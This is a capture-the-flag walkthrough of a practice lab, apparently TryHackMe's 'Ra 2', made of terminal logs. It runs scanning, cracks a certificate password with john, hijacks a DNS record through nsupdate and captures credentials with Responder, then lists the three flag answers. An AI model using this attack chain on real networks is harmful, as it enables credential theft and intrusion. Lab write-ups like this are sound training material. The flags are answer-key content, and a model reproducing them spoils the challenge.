...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ sudo nmap -A -sS -sC -sV -O 10.10.34.115
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ nikto -h 10.10.34.115
- Nikto v2.1.6
---------------------------------------------------------------------------
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ dig windcorp.thm any @10.10.34.115
...
windcorp.thm.           86400   IN      TXT     "THM{V0N318*****Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}"
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ sudo /opt/dirsearch/dirsearch.py -u https://fire.windcorp.thm -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 100 -x 400
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ sudo /opt/dirsearch/dirsearch.py -u https://selfservice.dev.windcorp.thm -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 100 -x 400[sudo] password for kali:
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ /usr/share/john/pfx2john.py cert.pfx > hash
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
...
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
Enter Import Password:
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
Enter Import Password:
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ nsupdate
> server 10.10.34.115
...
> send
> quit
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ dig selfservice.windcorp.thm @10.10.34.115
...
bibo318@parrot:~/CTFs/tryhackme/Ra 2$
```

```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ ls /usr/share/responder/certs
gen-self-signed-cert.sh  responder.crt  responder.key
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ sudo cp *.pem /usr/share/responder/certs
[sudo] password for kali:
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ ls /usr/share/responder/certs
crt.pem  gen-self-signed-cert.sh  key.pem  responder.crt  responder.key

bibo318@parrot:~/CTFs/tryhackme/Ra 2$ sudo nano /etc/responder/Responder.conf
```

```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra 2$ john edwardle.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
...
THM{V0N318*****8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}
...
type "Flag 3.txt"
THM{V0N318*****9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}
```

1. What is flag 1?

`THM{V0N318*****Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources12**123:))}`

2. What is flag 2?

`THM{V0N318*****8a1d460dfe345f8edd09d45ae00e5c1c14d12c8912**123:))}`

3. What is flag 3?

`THM{V0N318*****9a8b9f4f3af2bce68885106c1c8473ab85e0eda012**123:))}`
